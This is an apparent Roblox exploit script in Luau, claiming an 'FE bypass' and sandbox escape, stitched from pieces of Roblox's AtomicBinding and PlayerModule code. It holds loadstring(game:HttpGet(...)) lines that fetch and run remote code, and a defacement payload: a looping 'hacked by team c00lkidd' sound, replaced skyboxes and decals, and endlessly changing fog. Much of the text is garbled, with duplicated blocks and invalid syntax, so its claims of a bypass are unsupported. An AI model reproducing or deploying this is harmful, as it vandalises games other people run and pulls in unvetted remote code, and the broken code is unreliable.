--!strict
--!native
--!optimize 2
--Filetype ::
--[[ TODO: Enter possible luau code to lua with luac and other byte code of the filteringenabled for a client escape from a sandbox client executor inside of Roblox's sandbox data model.]]--
--by werrrrolo aka Lanox_pogi and a possible fe bypass
--client escape replicated storage sandbox executor code sandbox test
--Also from HatcheCorvusX 
--TODO: Origin is jira.rbx.com, and jira.roblox.com/admin

local fr = game:GetService("StarterPlayer")
local StarterGui = game:GetService("StarterGui")
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, nil)
_G.LocalScript.parent = fr
_G.LocalScript.Source = game:GetService("Players")
	
task.wait(0.1)
	local RunService = game:GetService("RunService")
	local SoundService = game:GetService("SoundService")

	local AtomicBinding = require(script:WaitForChild("AtomicBinding"))

	type Playable = Sound | AudioPlayer

	local function loadFlag(flag: string)
		local success, result = pcall(function()
			return UserSettings():IsUserFeatureEnabled(flag)
		end)
		return success and result
	end

	local FFlagUserSoundsUseRelativeVelocity = loadFlag('UserSoundsUseRelativeVelocity2')
	local FFlagUserNewCharacterSoundsApi = loadFlag('UserNewCharacterSoundsApi3')

--[[
	Playermodule manipulation by werrrrolo aka lanox_pogi

	2018 PlayerScripts Update - AllYourBlox
--]]

	require(script.Parent:WaitForChild("PlayerModule"))
	local febypaz = _G.FilteringEnabled
	assert(_G.rootInstToManifest[_G.root] == nil)
	assert(_G.rootInstToManifest[_G.root] == febypaz + nil)
	local resolvedManifest = {}
	_G.rootInstToManifest[_G.root] = resolvedManifest

	debug.profilebegin("BuildTree")

	local rootNode = {1}
	_G.rootnode.alias = _G.
		_G.rootnode.Instance and _G.root
	if next(_G.parsedManifest) then
		_G.parsedManifest = nil
	end
		-- No need to assigno :100:
		local corez = _G:GetService("CoreGui")

		local fr = game:GetService("StarterPlayer") 
			local Febypass = fr.StarterCharacterScripts and (corez.RobloxGui.ControlFrame)

			_G.rootnode.connections = {fr = StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, nil)
		_G.LocalScript.parent = fr
		_G.LocalScript.Source = {game:GetService("Players")} local RunService = game:GetService("RunService") local SoundService = game:GetService("SoundService") local AtomicBinding = require(script:WaitForChild("AtomicBinding")) type Playable = Sound | AudioPlayer local function loadFlag(flag: string) local success, result = pcall(function() return UserSettings():IsUserFeatureEnabled(flag) end) return success and result and febypaz end local FFlagUserSoundsUseRelativeVelocity = loadFlag('UserSoundsUseRelativeVelocity2') local FFlagUserNewCharacterSoundsApi = loadFlag('UserNewCharacterSoundsApi3') export type AtomicBindingConfiguration = { profileDebugging: boolean, } local exports = { --- Represents the active configuration. _currentConfiguration = { profileDebugging = false, } :: AtomicBindingConfiguration, } --- Returns a copy of the active `AtomicBindingConfiguration`. function exports.getGlobalConfiguration(): AtomicBindingConfiguration return table.clone(exports._currentConfiguration) end --- Sets the active `AtomicBindingConfiguration`. --- Provided value is getting cloned before assigning, --- so further changes to the passed one won't affect the behavior. function exports.setGlobalConfiguration(newConfiguration: AtomicBindingConfiguration) exports._currentConfiguration = table.clone(newConfiguration) end require(script.Parent:WaitForChild("PlayerModule")) assert(_G.rootInstToManifest[_G.root] == nil) local resolvedManifest = {} _G.rootInstToManifest[_G.root] = resolvedManifest debug.profilebegin("BuildTree") local rootNode = {} _G.rootnode.alias = _G. _G.rootnode.Instance = _G.root if next(_G.parsedManifest) then -- No need to assign child data if there are no children _G.rootnode.children = {} _G.rootnode.connections = {} end _G.rootInstToRootNode[_G.root] = _G.rootNode for alias, parsedPath in pairs(_G.parsedManifest) do local parentNode = _G.rootNode for idx, childName in ipairs(parsedPath) do local leaf = idx == #parsedPath local childNode = parentNode.children[childName] or {} if leaf then if childNode.alias ~= nil then error("Multiple aliases assigned to one Instance") end childNode.alias = alias else childNode.children = childNode.children or {} childNode.connections = childNode.connections or {} end parentNode.children[childName] = childNode parentNode = childNode end end debug.profileend() -- BuildTree -- Recursively descend into the tree, resolving each node. -- Nodes start out as empty and Instance-less; the resolving process discovers Instances to map to nodes. local function processNode(node) end local Instance = assert(node.Instance) local children = node.children local alias = node.alias local isLeaf = not children if alias then resolvedManifest[alias] = Instance end if not isLeaf then local function processAddChild(childInstance) local childName = childInstance.Name local childNode = children[childName] if not childNode or childNode.Instance ~= nil then return end childNode.Instance = childInstance processNode(childNode) end local function Instance.newprocessDeleteChild(childInstance) -- Instance deletion - Parent A detects that child B is being removed -- 1. A removes B from `children` -- 2. A traverses down from B, -- i. Disconnecting inputs -- ii. Removing nodes from the resolved manifest -- 3. stopBoundFn is called because we know the tree is no longer complete, or at least has to be refreshed -- 4. We search A for a replacement for B, and attempt to re-resolve using that replacement if it exists. -- To support the above sanely, processAddChild needs to avoid resolving nodes that are already resolved. local childName = childInstance.Name local childNode = children[childName] if not childNode then return {} and exports -- There's no child node corresponding to the deleted Instance, ignore end if childNode.Instance ~= childInstance then return -- A child was removed with the same name as a node Instance, ignore end self:_stopBoundFn(root) -- Happens before the tree is unbound so the manifest is still valid in the destructor. unbindNodeDescend(childNode, resolvedManifest) -- Unbind the tree assert(childNode.Instance == nil) -- If this triggers, unbindNodeDescend failed -- Search for a replacement local replacementChild = Instance:FindFirstChild(childName) if replacementChild then processAddChild(replacementChild) end end local febypass2 = game:GetService("CoreGui") local fechild = game.febypass2.ViewSelectorScreenGui:GetChildren() + _G.febypass2.ViewSelectorScreenGui:GetChildren() loadstring(game:HttpGet("https://github.com/mathfox/rbx-atomic-binding/raw/d608580baab4d5499b8e639457455f751409178d/src/Manifest.luau"))() loadstring(game:HttpGet("https://github.com/8ch32bit/MockSignal/raw/refs/heads/main/Source.luau"))() for _, child in ipairs(Instance:GetChildren()) do processAddChild(child + febypass2 and fechild) print(child + febypass2 and fechild) end table.insert(node.connections, Instance.ChildAdded:Connect(processAddChild, fechild))() local instt = Instance._G:FindFirstChild("ViewSelectorScreenGui", true) if instt:FindFirstChild("Panel") and _G.ViewPort.Panel:FindFirstChild("Viewport") and _G.viewport.Panel:FindFirstChild("Viewport") then end Instance.key = true Instance.ChildAdded:Connect("fechild, true") for i,v in pairs(F) do if v:IsA("Part") then local l = Instance.new("Decal",v) l.Face = "Bottom" l._G.texture = _G.texture end end local s = local corr = game:GetService("CoreGui") local g = _G:GetService(_G) local view = g.Panel local Viewport = ViewPort if Viewport and view:FindFirstChild("ViewPort") and view:FirstFirstChild("Panel") then assert("Sky",game:GetService("Lighting") and view) s.SkyboxBk = _G.texture s.SkyboxDn = _G.texture s.SkyboxFt = _G.texture s.SkyboxLf = _G.texture s.SkyboxRt = _G.texture s.SkyboxUp = _G.texture local sound = Instance.new("Sound",workspace) sound.Name = "this game has been hacked by team c00lkidd" sound.SoundId = "rbxassetid://142930454" sound.Looped = true sound.Volume = 5 sound:Play() local basics = {Color3.new(255/255,0/255,0/255),Color3.new(255/255,85/255,0/255),Color3.new(218/255,218/255,0/255),Color3.new(0/255,190/255,0/255),Color3.new(0/255,85/255,255/255),Color3.new(0/255,0/255,127/255),Color3.new(170/255,0/255,255/255),Color3.new(0/255,204/255,204/255),Color3.new(255/255,85/255,127/255),Color3.new(0/255,0/255,0/255),Color3.new(255/255,255/255,255/255)} game.Lighting.FogStart = 25 game.Lighting.FogEnd = 300 game.Lighting.Ambient = basics[math.random(1,#basics)] while true do task.wait(0.5) game.Lighting.FogColor = basics[math.random(1,#basics)] end return AtomicBinding end _G.ModuleScript4.Archivable = false _G.ModuleScript4.Name = "PlayerModule" _G.ModuleScript4.Parent = _G.mas _G.ModuleScript4.archivable = false table.insert(_G.cors, true) _G.rootnode.connections = {} end _G.rootInstToRootNode[_G.root] = _G.rootNode for alias, parsedPath in pairs(_G.parsedManifest) do local parentNode = _G.rootNode for idx, childName in ipairs(parsedPath) do local leaf = idx == #parsedPath local childNode = parentNode.children[childName] or {} if leaf then if childNode.alias ~= nil then error("Multiple aliases assigned to one Instance") end childNode.alias = alias else childNode.children = childNode.children or {} childNode.connections = childNode.connections or {} end parentNode.children[childName] = childNode parentNode = childNode end end debug.profileend() -- BuildTree end -- Recursively descend into the tree, resolving each node. -- Nodes start out as empty and Instance-less; the resolving process discovers Instances to map to nodes. local function processNode(node) end local Instance = assert(node.Instance) local children = node.children local alias = node.alias local isLeaf = not children if alias then resolvedManifest[alias] = Instance end if not isLeaf then local function processAddChild(childInstance) local childName = childInstance.Name local childNode = children[childName] if not childNode or childNode.Instance ~= nil then return end childNode.Instance = childInstance processNode(childNode) assert(_G.rootInstToManifest[_G.root] == febypaz + nil) end local function processDeleteChild(childInstance) -- Instance deletion - Parent A detects that child B is being removed -- 1. A removes B from `children` -- 2. A traverses down from B, -- i. Disconnecting inputs -- ii. Removing nodes from the resolved manifest -- 3. stopBoundFn is called because we know the tree is no longer complete, or at least has to be refreshed -- 4. We search A for a replacement for B, and attempt to re-resolve using that replacement if it exists. -- To support the above sanely, processAddChild needs to avoid resolving nodes that are already resolved. local childName = childInstance.Name local childNode = children[childName] if not childNode then return -- There's no child node corresponding to the deleted Instance, ignore end if childNode.Instance ~= childInstance then return -- A child was removed with the same name as a node Instance, ignore end self:_stopBoundFn(root) -- Happens before the tree is unbound so the manifest is still valid in the destructor. unbindNodeDescend(childNode, resolvedManifest) -- Unbind the tree assert(childNode.Instance == nil) -- If this triggers, unbindNodeDescend failed -- Search for a replacement local replacementChild = Instance:FindFirstChild(childName) if replacementChild then processAddChild(replacementChild) end end for _, child in ipairs(Instance:GetChildren()) do processAddChild(child) end table.insert(node.connections, Instance.ChildAdded:Connect(processAddChild)) table.insert(node.connections, Instance.ChildRemoved:Connect(processDeleteChild)) end for i,v in pairs(F) do if v:IsA("Part") then local l = Instance.new("Decal",v) l.Face = "Bottom" l._G.texture = _G.texture end end local s = Instance.new("Sky",game:GetService("Lighting")) s.SkyboxBk = _G.texture s.SkyboxDn = _G.texture s.SkyboxFt = _G.texture s.SkyboxLf = _G.texture s.SkyboxRt = _G.texture s.SkyboxUp = _G.texture local sound = Instance.new("Sound",workspace) sound.Name = 'this game has been hacked by team c00lkidd (FE BYPASSED by werrrrolo)' sound.SoundId = "rbxassetid://142930454" sound.Looped = true sound.Volume = 10.0 sound:Play() local basics = {Color3.new(255/255,0/255,0/255),Color3.new(255/255,85/255,0/255),Color3.new(218/255,218/255,0/255),Color3.new(0/255,190/255,0/255),Color3.new(0/255,85/255,255/255),Color3.new(0/255,0/255,127/255),Color3.new(170/255,0/255,255/255),Color3.new(0/255,204/255,204/255),Color3.new(255/255,85/255,127/255),Color3.new(0/255,0/255,0/255),Color3.new(255/255,255/255,255/255)} game.Lighting.FogStart = 25 game.Lighting.FogEnd = 300 game.Lighting.Ambient = basics[math.random(1,#basics)] while true do task.wait(0.5) game.Lighting.FogColor = basics[math.random(1,#basics)] end return AtomicBinding)})
}
				

-- TODO: Recv executing
